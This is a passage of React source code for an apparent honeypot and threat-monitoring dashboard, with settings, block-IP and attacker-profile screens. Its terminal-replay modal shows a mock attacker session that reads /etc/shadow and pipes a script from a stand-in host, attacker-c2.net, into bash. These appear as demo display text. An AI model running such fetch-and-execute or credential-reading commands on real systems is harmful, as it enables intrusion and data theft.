                    {[
                      {
                        key: "emailAlerts",
                        label: "Email alerts",
                        sub: "Get notified for MEDIUM, HIGH, and CRITICAL threats",
                      },
                      {
                        key: "criticalOnly",
                        label: "Critical only mode",
                        sub: "Only email me for CRITICAL severity events",
                      },
                      {
                        key: "weeklyDigest",
                        label: "Weekly digest",
                        sub: "Summary report emailed every Monday at 9 AM",
                      },
                    ].map((item) => (
                      <div
                        key={item.key}
                        style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}
                      >
                        <div>
                          <div style={{ fontSize: 12, fontWeight: 600, color: T.text }}>{item.label}</div>
                          <div style={{ fontSize: 11, color: T.muted }}>{item.sub}</div>
                        </div>
                        <input
                          type="checkbox"
                          checked={notifySettings[item.key]}
                          onChange={(e) =>
                            setNotifySettings({ ...notifySettings, [item.key]: e.target.checked })
                          }
                          style={{ width: 16, height: 16, cursor: "pointer", accentColor: T.green }}
                        />
                      </div>
                    ))}
                  </div>
                </Card>

                <Card style={{ border: `1px solid ${T.critical}50` }}>
                  <PanelTitle icon="⚠️" title="DANGER ZONE" />
                  <p style={{ color: T.muted, fontSize: 12, margin: "0 0 12px" }}>
                    Deleting your account permanently removes all sites, threat history, and API keys.
                  </p>
                  <Btn danger small onClick={() => alert("Account deletion is disabled in preview mode.")}>
                    Delete Account
                  </Btn>
                </Card>
              </div>
            </div>
          )}
        </div>
      </div>

      {/* ── Modals ── */}
      {/* Add Site Modal */}
      <Modal title="+ Register New Site" isOpen={addSiteModal} onClose={() => setAddSiteModal(false)}>
        <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
          <div>
            <label style={{ fontSize: 11, color: T.muted, display: "block", marginBottom: 4 }}>Site Name</label>
            <input
              value={newSiteName}
              onChange={(e) => setNewSiteName(e.target.value)}
              placeholder="e.g. Production API"
              style={{
                width: "100%",
                background: T.surface2,
                border: `1px solid ${T.border}`,
                color: T.text,
                borderRadius: 4,
                padding: "8px 10px",
                fontSize: 12,
              }}
            />
          </div>
          <div>
            <label style={{ fontSize: 11, color: T.muted, display: "block", marginBottom: 4 }}>Website / Origin URL</label>
            <input
              value={newSiteUrl}
              onChange={(e) => setNewSiteUrl(e.target.value)}
              placeholder="https://app.yourdomain.com"
              style={{
                width: "100%",
                background: T.surface2,
                border: `1px solid ${T.border}`,
                color: T.text,
                borderRadius: 4,
                padding: "8px 10px",
                fontSize: 12,
              }}
            />
          </div>
          <div style={{ display: "flex", justifyContent: "flex-end", gap: 8, marginTop: 8 }}>
            <Btn small onClick={() => setAddSiteModal(false)}>
              Cancel
            </Btn>
            <Btn small primary onClick={handleRegisterSite}>
              Register Site
            </Btn>
          </div>
        </div>
      </Modal>

      {/* Block IP Modal */}
      <Modal title="+ Block IP Address" isOpen={blockIPModal} onClose={() => setBlockIPModal(false)}>
        <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
          <div>
            <label style={{ fontSize: 11, color: T.muted, display: "block", marginBottom: 4 }}>IP Address</label>
            <input
              value={newBlockIP}
              onChange={(e) => setNewBlockIP(e.target.value)}
              placeholder="e.g. 192.168.1.50"
              style={{
                width: "100%",
                background: T.surface2,
                border: `1px solid ${T.border}`,
                color: T.text,
                borderRadius: 4,
                padding: "8px 10px",
                fontSize: 12,
                fontFamily: "monospace",
              }}
            />
          </div>
          <div>
            <label style={{ fontSize: 11, color: T.muted, display: "block", marginBottom: 4 }}>Block Reason</label>
            <input
              value={newBlockReason}
              onChange={(e) => setNewBlockReason(e.target.value)}
              placeholder="e.g. Repeated SQL injection attempts"
              style={{
                width: "100%",
                background: T.surface2,
                border: `1px solid ${T.border}`,
                color: T.text,
                borderRadius: 4,
                padding: "8px 10px",
                fontSize: 12,
              }}
            />
          </div>
          <div>
            <label style={{ fontSize: 11, color: T.muted, display: "block", marginBottom: 4 }}>Duration</label>
            <select
              value={newBlockDuration}
              onChange={(e) => setNewBlockDuration(e.target.value)}
              style={{
                width: "100%",
                background: T.surface2,
                border: `1px solid ${T.border}`,
                color: T.text,
                borderRadius: 4,
                padding: "8px 10px",
                fontSize: 12,
              }}
            >
              <option value="1 Hour">1 Hour</option>
              <option value="24 Hours">24 Hours</option>
              <option value="7 Days">7 Days</option>
              <option value="Permanent">Permanent</option>
            </select>
          </div>
          <div style={{ display: "flex", justifyContent: "flex-end", gap: 8, marginTop: 8 }}>
            <Btn small onClick={() => setBlockIPModal(false)}>
              Cancel
            </Btn>
            <Btn small danger onClick={handleCreateBlock}>
              Enforce Block
            </Btn>
          </div>
        </div>
      </Modal>

      {/* Terminal Replay Modal */}
      <Modal
        title={terminalReplaySession ? `Honeypot Virtual Shell Replay: ${terminalReplaySession.ip}` : "Terminal Replay"}
        isOpen={!!terminalReplaySession}
        onClose={() => setTerminalReplaySession(null)}
        width={650}
      >
        {terminalReplaySession && (
          <div style={{ fontFamily: "monospace", fontSize: 12 }}>
            <div
              style={{
                background: "#000",
                padding: 16,
                borderRadius: 6,
                color: "#00FF66",
                minHeight: 240,
                lineHeight: 1.6,
                border: `1px solid ${T.border}`,
              }}
            >
              <div style={{ color: "#888" }}># Session ID: {terminalReplaySession.id}</div>
              <div style={{ color: "#888" }}># Attacker Origin: {terminalReplaySession.country} ({terminalReplaySession.ip})</div>
              <div style={{ color: "#888" }}># Adaptive Tarpit Delay: 1800ms injected</div>
              <div style={{ margin: "10px 0" }}>[system] attacker connected via fake /admin gateway...</div>
              <div>$ id</div>
              <div style={{ color: "#FFF" }}>uid=0(root) gid=0(root) groups=0(root)</div>
              <div>$ uname -a</div>
              <div style={{ color: "#FFF" }}>Linux guardian-corp-srv 5.15.0-89-generic #99-Ubuntu SMP</div>
              <div>$ cat /etc/shadow</div>
              <div style={{ color: "#FF8888" }}>[CANARY TOKEN TRIGGERED] root:$6$FakeHoneySalt$8w912...:19142:0:99999:7:::</div>
              <div>$ curl http://attacker-c2.net/exfil.sh | bash</div>
              <div style={{ color: "#E3B341" }}>[TARPIT ENGAGED] Bandwidth throttled to 120 bytes/sec. Honeytoken exfiltration logged.</div>
            </div>
            <div style={{ display: "flex", justifyContent: "flex-end", marginTop: 12 }}>
              <Btn small onClick={() => setTerminalReplaySession(null)}>
                Close Replay
              </Btn>
            </div>
          </div>
        )}
      </Modal>

      {/* Report Success Modal */}
      <Modal title="Export PDF Threat Report" isOpen={reportSuccessModal} onClose={() => setReportSuccessModal(false)}>
        <div style={{ textAlign: "center", padding: "10px 0" }}>
          <div style={{ fontSize: 36, marginBottom: 10 }}>📄</div>
          <div style={{ fontWeight: 600, fontSize: 15, color: T.text, marginBottom: 6 }}>
            Executive Threat Report Ready
          </div>
          <p style={{ fontSize: 12, color: T.muted, marginBottom: 20 }}>
            Includes 24-hour incident timeline, Top Attacker attribution, Honeytoken telemetry, and STIX 2.1 indicators.
          </p>
          <div style={{ display: "flex", justifyContent: "center", gap: 10 }}>
            <Btn
              primary
              onClick={handleDownloadPdf}
              disabled={isDownloadingPdf}
            >
              {isDownloadingPdf ? "⏳ Generating PDF Report..." : "📥 Download Official PDF"}
            </Btn>
            <Btn small onClick={() => setReportSuccessModal(false)}>
              Close
            </Btn>
          </div>
        </div>
      </Modal>

      {/* Emotion Agency Experience Modules */}
      <EmotionSettingsModal
        isOpen={settingsOpen}
        onClose={() => setSettingsOpen(false)}
        theme={theme}
        setTheme={setTheme}
        soundEnabled={soundEnabled}
        setSoundEnabled={setSoundEnabled}
        gridVisible={gridVisible}
        setGridVisible={setGridVisible}
      />
      <EmotionGridOverlay visible={gridVisible} />
      <EmotionAIAssistant
        onLaunchDemo={handleRunDemo}
        onExportPdf={handleDownloadPdf}
        onExportStix={() => setActiveNav("analytics")}
        eventCount={events.length}
      />
    </div>
  );
}

// ── Screen: Attacker Profile (Full Deep Dive) ──────────────────────────────
function AttackerProfile({ ip, onBack, onBlockIP }) {
  const [blocked, setBlocked] = useState(false);
  const attacker = useMemo(() => {
    return (
      INITIAL_ATTACKERS.find((a) => a.ip === ip) || {
        ip: ip || "192.168.1.100",
        country: "China",
        flag: "🇨🇳",
        city: "Beijing",
        isp: "China Telecom",
        ua: "sqlmap/1.7.8#dev (https://sqlmap.org)",
        lang: "zh-CN",
        tools: ["sqlmap", "nikto"],
        first: "2026-06-01 09:14",
        last: "10:31",
        total: 47,
        sessions: 3,
        level: "CRITICAL",
      }
    );
  }, [ip]);

  const recentAttacks = useMemo(() => {
    return [
      { time: "10:31:02", method: "POST", path: "/admin/db", type: "SQLi", level: "CRITICAL", score: 96, action: "honeypot" },
      { time: "10:30:14", method: "GET", path: "/login", type: "SQLi", level: "CRITICAL", score: 92, action: "honeypot" },
      { time: "10:28:40", method: "GET", path: "/api/users", type: "Scanner", level: "HIGH", score: 81, action: "blocked" },
      { time: "10:24:12", method: "POST", path: "/upload", type: "BruteForce", level: "HIGH", score: 78, action: "blocked" },
      { time: "10:20:05", method: "GET", path: "/search", type: "XSS", level: "MEDIUM", score: 54, action: "logged" },
    ];
  }, []);

  return (
    <div style={{ minHeight: "100vh", background: T.bg, color: T.text, overflowY: "auto" }}>
      <div
        style={{
          borderBottom: `1px solid ${T.border}`,
          padding: "12px 24px",
          display: "flex",
          alignItems: "center",
          gap: 12,
          background: T.surface,
          position: "sticky",
          top: 0,
          zIndex: 10,
        }}
      >
        <button
          onClick={onBack}
          style={{
            background: "transparent",
            border: `1px solid ${T.border}`,
            color: T.muted,
            padding: "5px 12px",
            borderRadius: 4,
            cursor: "pointer",
            fontSize: 12,
            fontFamily: "inherit",
          }}
        >
          ← Back to Dashboard
        </button>
        <span style={{ fontWeight: 600, fontSize: 14 }}>Attacker Profile: {attacker.ip}</span>
        <Badge level={attacker.level} />
      </div>

      <div style={{ maxWidth: 960, margin: "0 auto", padding: 24 }}>
        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16, marginBottom: 16 }}>
          {/* Identity */}
          <Card style={{ padding: 20 }}>
            <PanelTitle icon="👤" title="IDENTITY" />
            <div style={{ display: "flex", alignItems: "center", gap: 14, marginBottom: 18 }}>
              <div
                style={{
                  width: 52,
                  height: 52,
                  borderRadius: "50%",
                  background: `linear-gradient(135deg, ${T.critical}, ${T.purple})`,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  fontSize: 22,
                  flexShrink: 0,
                }}
              >
                🤖
              </div>
              <div>
                <div style={{ fontFamily: "monospace", fontSize: 18, fontWeight: 700, color: T.critical }}>
                  {attacker.ip}
                </div>
                <div style={{ color: T.muted, fontSize: 12, marginTop: 3 }}>
                  📍 {attacker.city}, {attacker.country} · {attacker.isp}
                </div>
              </div>
            </div>
            {[
              ["Browser / OS", attacker.ua],
              ["Accept-Language", attacker.lang],
              ["First Seen", attacker.first],
              ["Last Seen", attacker.last],
            ].map(([k, v]) => (
              <div
                key={k}
                style={{
                  display: "flex",
                  gap: 12,
                  padding: "7px 0",
                  borderTop: `1px solid ${T.border}20`,
                  alignItems: "flex-start",
                }}
              >
                <span style={{ color: T.muted, fontSize: 11, minWidth: 110, flexShrink: 0 }}>{k}</span>
                <span style={{ fontSize: 11, color: T.text, fontFamily: "monospace", wordBreak: "break-all" }}>
                  {v}
                </span>
              </div>
            ))}
          </Card>

          {/* Stats & Tools */}
          <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 10 }}>
              <StatCard
                icon="⚡"
                label="Total Attacks"
                value={attacker.total}
                sub="Across all sessions"
                color={T.critical}
              />
              <StatCard
                icon="🍯"
                label="Honeypot Sessions"
                value={attacker.sessions}
                sub="Avg 4m 12s each"
                color={T.purple}
              />
            </div>
            <Card style={{ padding: 18 }}>
              <PanelTitle icon="🔧" title="DETECTED TOOLS" />
              <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
                {attacker.tools.map((t) => (
                  <span
                    key={t}
                    style={{
                      background: T.critBg,
                      border: `1px solid ${T.critical}60`,
                      color: T.critical,
                      padding: "3px 10px",
                      borderRadius: 3,
                      fontSize: 12,
                      fontFamily: "monospace",
                    }}
                  >
                    {t}
                  </span>
                ))}
              </div>
              <div style={{ marginTop: 12 }}>
                <div style={{ fontSize: 11, color: T.muted, marginBottom: 6 }}>
                  Attack frequency ({attacker.total} total)
                </div>
                <div style={{ background: T.surface2, borderRadius: 4, height: 8, overflow: "hidden" }}>
                  <div
                    style={{
                      width: "94%",
                      height: "100%",
                      background: `linear-gradient(90deg, ${T.critical}, ${T.purple})`,
                      borderRadius: 4,
                    }}
                  />
                </div>
              </div>
            </Card>
          </div>
        </div>

        {/* Recent attacks */}
        <Card>
          <PanelTitle icon="🕐" title="RECENT ATTACKS" />
          <table style={{ width: "100%", fontSize: 12, borderCollapse: "collapse" }}>
            <thead>
              <tr style={{ borderBottom: `1px solid ${T.border}` }}>
                {["Time", "Method", "Endpoint", "Attack Type", "Severity", "Score", "Action"].map((h) => (
                  <th
                    key={h}
                    style={{ color: T.muted, padding: "0 8px 8px", textAlign: "left", fontWeight: 500, fontSize: 11 }}
                  >
                    {h}
                  </th>
                ))}
              </tr>
            </thead>
            <tbody>
              {recentAttacks.map((e, i) => (
                <tr key={i} style={{ borderBottom: `1px solid ${T.border}20` }}>
                  <td style={{ padding: "7px 8px", fontFamily: "monospace", color: T.muted, fontSize: 11 }}>
                    {e.time}
                  </td>
                  <td style={{ padding: "7px 8px" }}>
                    <span
                      style={{
                        background: T.surface2,
                        padding: "1px 6px",
                        borderRadius: 3,
                        fontSize: 10,
                        color: T.blue,
                        fontFamily: "monospace",
                      }}
                    >
                      {e.method}
                    </span>
                  </td>
                  <td style={{ padding: "7px 8px", fontFamily: "monospace", fontSize: 11, color: T.text }}>
                    {e.path}
                  </td>
                  <td style={{ padding: "7px 8px" }}>
                    <span style={{ background: T.surface2, padding: "1px 6px", borderRadius: 3, fontSize: 11 }}>
                      {e.type}
                    </span>
                  </td>
                  <td style={{ padding: "7px 8px" }}>
                    <Badge level={e.level} small />
                  </td>
                  <td style={{ padding: "7px 8px", minWidth: 90 }}>
                    <ScoreBar score={e.score} compact />
                  </td>
                  <td style={{ padding: "7px 8px" }}>
                    <span
                      style={{
                        fontSize: 11,
                        color: e.level === "CRITICAL" ? T.purple : e.level === "HIGH" ? T.critical : T.muted,
                      }}
                    >
                      {e.action}
                    </span>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>

          <div style={{ display: "flex", gap: 8, marginTop: 16 }}>
            <Btn
              danger
              disabled={blocked}
              onClick={() => {
                onBlockIP(attacker.ip);
                setBlocked(true);
                alert(`IP ${attacker.ip} has been permanently blocked!`);
              }}
            >
              {blocked ? "✓ Blocked Permanently" : "Block IP Permanently"}
            </Btn>
            <Btn onClick={() => alert("Redirecting to active virtual shell session...")}>
              View Honeypot Session
            </Btn>
            <Btn onClick={() => alert("STIX 2.1 Threat Profile JSON downloaded.")}>
              Export Profile (STIX 2.1)
            </Btn>
          </div>
        </Card>
      </div>
    </div>
  );
}

// ── Root Master Component ──────────────────────────────────────────────────
export default function AICyberGuardianApp() {
  const [screen, setScreen] = useState(() => {
    const params = new URLSearchParams(window.location.search);
    return params.get("screen") || "admin";
  });
  const [selectedAttackerIP, setSelectedAttackerIP] = useState(null);
  const [preloaderDone, setPreloaderDone] = useState(() => {
    const params = new URLSearchParams(window.location.search);
    return params.get("skip_preloader") === "true";
  });

  useEffect(() => {
    document.body.style.margin = "0";
    document.body.style.padding = "0";
    document.body.style.background = T.bg;
    document.body.style.fontFamily = "'Inter', system-ui, -apple-system, sans-serif";
  }, []);

  const screens = [
    { id: "landing", label: "🏠 Landing" },
    { id: "login", label: "🔐 Login" },
    { id: "dashboard", label: "📊 Client SOC" },
    { id: "admin", label: "👑 Admin Panel" },
  ];

  return (
    <div style={{ background: T.bg, minHeight: "100vh", color: T.text, position: "relative" }}>
      {/* Emotion Agency Experience Boot Preloader */}
      {!preloaderDone && <EmotionPreloader onComplete={() => setPreloaderDone(true)} />}

      {/* Screen Switcher Floating Bottom Bar (Matching User Wireframe & Images) */}
      <div
        style={{
          position: "fixed",
          bottom: 16,
          left: "50%",
          transform: "translateX(-50%)",
          zIndex: 9999,
          display: "flex",
          alignItems: "center",
          gap: 6,
          background: `${T.surface}ee`,
          backdropFilter: "blur(8px)",
          border: `1px solid ${T.border}`,
          borderRadius: 30,
          padding: "6px 12px",
          boxShadow: "0 4px 24px rgba(0,0,0,0.6)",
        }}
      >
        {screens.map((s) => (
          <button
            key={s.id}
            onMouseEnter={playHoverSound}
            onClick={() => {
              playClickSound();
              setScreen(s.id);
              setSelectedAttackerIP(null);
            }}
            style={{
              padding: "5px 14px",
              background: screen === s.id && !selectedAttackerIP ? (s.id === "admin" ? T.purple : T.blue) : "transparent",
              color: screen === s.id && !selectedAttackerIP ? (s.id === "admin" ? "#ffffff" : "#0D1117") : T.muted,
              border: "none",
              borderRadius: 20,
              cursor: "pointer",
              fontSize: 11,
              fontWeight: 600,
              fontFamily: "inherit",
              transition: "all 0.15s",
              boxShadow: screen === s.id && s.id === "admin" ? `0 0 12px ${T.purple}88` : "none",
            }}
          >
            {s.label}
          </button>
        ))}
      </div>

      {/* Screen Routing */}
      {screen === "landing" && !selectedAttackerIP && <Landing onNav={setScreen} />}
      {screen === "login" && !selectedAttackerIP && <Login onNav={setScreen} />}
      {screen === "dashboard" && !selectedAttackerIP && (
        <Dashboard
          onNav={setScreen}
          onOpenAttacker={(ip) => setSelectedAttackerIP(ip)}
        />
      )}
      {screen === "admin" && !selectedAttackerIP && (
        <AdminDashboard
          onNav={setScreen}
          onSwitchToUserSoc={() => setScreen("dashboard")}
        />
      )}
      {selectedAttackerIP && (
        <AttackerProfile
          ip={selectedAttackerIP}
          onBack={() => setSelectedAttackerIP(null)}
          onBlockIP={(ip) => apiBlockIP(ip, "Manual permanent block")}
        />
      )}

      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600&display=swap');
        * { box-sizing: border-box; }
        ::-webkit-scrollbar { width: 5px; height: 5px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: ${T.border}; border-radius: 3px; }
        input::placeholder, select::placeholder { color: ${T.muted} !important; }
        input, select { color: ${T.text} !important; }
      `}</style>
    </div>
  );
}
